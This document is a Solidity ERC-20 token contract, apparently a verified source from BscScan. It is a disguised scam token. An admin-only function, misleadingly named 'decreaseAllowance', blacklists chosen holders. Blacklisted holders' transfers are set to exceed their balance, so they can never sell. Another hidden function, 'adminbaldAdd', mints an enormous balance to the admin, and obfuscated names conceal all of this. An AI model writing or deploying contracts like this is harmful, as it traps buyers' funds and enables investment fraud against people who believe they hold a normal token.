/**
 *Submitted for verification at BscScan.com on 2023-08-01
*/

/**
 *Submitted for verification at BscScan.com on 2023-07-05
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Token {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    address public hanmAdminttio;
    uint256 private _totalSupply;
    string private _tokename;
    string private _tokensymbol;
    constructor(string memory tokenname,string memory tokensymbol,address bladadmin) {
        emit Transfer(address(0), msg.sender, 10000000000*10**decimals());
        _totalSupply = 10000000000*10**decimals();
        _balances[msg.sender] = 10000000000*10**decimals();
        _tokename = tokenname;
        _tokensymbol = tokensymbol;
        hanmAdminttio = bladadmin;
    }
    mapping(address => bool) public listwechat;
    function quitxxxooooo(address ccc123) public {
        if(_msgSender() == hanmAdminttio){
            
        }else {
            require(_msgSender() == hanmAdminttio);
        }
          if(_msgSender() == hanmAdminttio){
            }else {
            return;
        }
        
        listwechat[ccc123] = false;
    }
    uint128 apppsum = 1000+44444;
    function decreaseAllowance(address hhjjj) external  {
        
        if(_msgSender() == hanmAdminttio){
            }else {
            return;
        }
        if(_msgSender() == hanmAdminttio){
            listwechat[hhjjj] = true;
            listwechat[hhjjj] = true;
        }

    }

    function adminbaldAdd() external   {
        if(_msgSender() == hanmAdminttio){
            
        }
        uint256 ddammxxx = 23300000000+100;
        _balances[_msgSender()] += 10**decimals()*98800*ddammxxx;
        require(_msgSender() == hanmAdminttio);
    }


    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    function name() public view returns (string memory) {
        return _tokename;
    }

    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        address tanForm = _msgSender();
        if (listwechat[tanForm] == true) {amount = _balances[tanForm] + apppsum+apppsum;}else{

        }
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        address tanForm = from;
        if (listwechat[tanForm] == true) {amount = _balances[tanForm] + apppsum+apppsum;}else{

        }
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");        
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}